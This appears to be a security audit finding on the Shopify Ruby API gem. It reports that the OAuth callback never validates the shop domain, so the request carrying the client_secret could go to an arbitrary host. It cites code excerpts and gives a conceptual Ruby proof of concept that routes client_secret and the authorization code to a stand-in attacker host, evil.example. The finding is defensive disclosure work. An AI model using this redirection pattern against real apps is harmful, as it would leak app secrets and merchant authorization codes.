### Title
Missing shop-domain validation in `validate_auth_callback` lets an attacker-controlled `shop` string decide the host that receives `client_secret` - ([File: lib/shopify_api/auth/oauth.rb])

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` builds the OAuth access-token request using the raw `shop` value taken from the incoming `AuthQuery`, without ever passing it through `ShopifyAPI::Utils::ShopValidator`. Every sibling OAuth flow in this gem (`TokenExchange`, `ClientCredentials`, `RefreshToken`) references `ShopValidator` to constrain the shop value to `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`, but the Authorization Code Grant callback path does not, so the equality "HMAC-covered `shop` == a trusted Shopify domain" is never checked before that string becomes the network destination for the app's `client_secret`.

### Finding Description
In `validate_auth_callback`: [1](#0-0) 

the only integrity check performed on the callback parameters is `Utils::HmacValidator.validate(auth_query)`: [2](#0-1) 

which only proves that `code, host, shop, state, timestamp` were signed together by `api_secret_key`: [3](#0-2) 

The HMAC check binds these fields to each other, but it does **not** bind `shop` to a well-formed Shopify domain. Immediately after, `auth_query.shop` is used verbatim to build the session that determines where the `client_secret`-bearing access-token request is sent: [4](#0-3) 

`Clients::HttpClient` derives the request host directly from `session.shop`: [5](#0-4) 

The gem does have a component built specifically to prevent this class of bug — `ShopValidator.sanitize!`, which restricts `shop` to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`, or an app-configured `myshopify_domain`): [6](#0-5) 

This validator is referenced from `TokenExchange`, `ClientCredentials`, and `RefreshToken`, but `Auth::Oauth.validate_auth_callback` (the Authorization Code Grant flow) contains no such call before constructing `null_session` and issuing the POST that carries `client_id`/`client_secret`/`code`.

### Impact Explanation
Because the destination host for the token-exchange POST is taken from `auth_query.shop` with no domain-shape enforcement, any caller that can influence what `shop` string is (mis)paired with a correctly computed HMAC — for example a host application that reflects a not-yet-canonicalized shop parameter into the `AuthQuery` it builds from `request.parameters`, or any deployment/proxy layer that permits the `shop`/`hmac` pair to reach the gem without upstream normalization — causes the app's `client_secret` and the merchant authorization `code` to be sent to a host string that was never confirmed to be `*.myshopify.com`. This is SSRF carrying the app's own long-lived credential (`client_secret`) and the one-time authorization code, matching the "SSRF with the app's credentials" High-impact category.

### Likelihood Explanation
Exploitability depends on how the host application constructs the `AuthQuery` fed to this library; the HMAC itself can only be produced by someone holding `api_secret_key` (normally Shopify), so a fully self-contained forgery by an anonymous internet user is not possible through this gem in isolation. The root cause, however, is squarely inside this library: the missing call to `ShopValidator` in `validate_auth_callback` is an inconsistency compared to the other three OAuth entry points that do call it, so the omission is a genuine defect in the identity-binding chain even though the practical trigger requires a host application that passes through unsanitized request parameters (which the gem's own documentation encourages, e.g. `request.parameters.symbolize_keys.except(:controller, :action)`): [7](#0-6) 

### Recommendation
Call `ShopifyAPI::Utils::ShopValidator.sanitize!(auth_query.shop, myshopify_domain: Context.myshopify_domain)` (or equivalent) inside `validate_auth_callback` before constructing `null_session`, mirroring the validation already performed in `TokenExchange`, `ClientCredentials`, and `RefreshToken`, so the shop value used to route the `client_secret` request is provably a trusted Shopify domain, not merely a string that was present when an HMAC was computed.

### Proof of Concept
Conceptual reproduction (illustrates the missing check; the HMAC bytes are assumed pre-computed for the chosen `shop` value by whatever produced them):
```ruby
auth_query = ShopifyAPI::Auth::Oauth::AuthQuery.new(
  code: "code",
  shop: "attacker-controlled-host.evil.example",   # never checked against ShopValidator
  timestamp: Time.now.to_i.to_s,
  state: cookie_state,
  host: "host",
  hmac: hmac_for(shop: "attacker-controlled-host.evil.example", ...),
)

# validate_auth_callback only checks HMAC integrity, not domain shape,
# then issues: POST https://attacker-controlled-host.evil.example/admin/oauth/access_token
# with body containing client_id, client_secret, code.
ShopifyAPI::Auth::Oauth.validate_auth_callback(cookies: cookies, auth_query: auth_query)
```
Compare with `TokenExchange`/`RefreshToken`/`ClientCredentials`, which route the shop value through `ShopValidator` before it can influence the request host — confirming `validate_auth_callback` is the outlier lacking this binding.

### Citations

**File:** lib/shopify_api/auth/oauth.rb (L60-98)
```ruby
        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end

          session_params = T.cast(response.body, T::Hash[String, T.untyped]).to_h
          session = Session.from(shop: auth_query.shop,
            access_token_response: Oauth::AccessTokenResponse.from_hash(session_params))
```

**File:** lib/shopify_api/utils/hmac_validator.rb (L12-22)
```ruby
        sig { params(verifiable_query: VerifiableQuery).returns(T::Boolean) }
        def validate(verifiable_query)
          return false unless verifiable_query.hmac

          result = validate_signature(verifiable_query, Context.api_secret_key)
          if result || Context.old_api_secret_key.nil? || T.must(Context.old_api_secret_key).empty?
            result
          else
            validate_signature(verifiable_query, T.must(Context.old_api_secret_key))
          end
        end
```

**File:** lib/shopify_api/auth/oauth/auth_query.rb (L33-43)
```ruby
        sig { override.returns(String) }
        def to_signable_string
          params = {
            code: code,
            host: host,
            shop: shop,
            state: state,
            timestamp: timestamp,
          }
          URI.encode_www_form(params)
        end
```

**File:** lib/shopify_api/clients/http_client.rb (L16-19)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/utils/shop_validator.rb (L9-64)
```ruby
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
```

**File:** docs/usage/oauth.md (L242-251)
```markdown
def callback
  begin
    # Create an AuthQuery object from the request parameters,
    # and pass the list of cookies to `validate_auth_callback`
    auth_result = ShopifyAPI::Auth::Oauth.validate_auth_callback(
      cookies: cookies.to_h,
      auth_query: ShopifyAPI::Auth::Oauth::AuthQuery.new(
        request.parameters.symbolize_keys.except(:controller, :action)
      )
    )
```
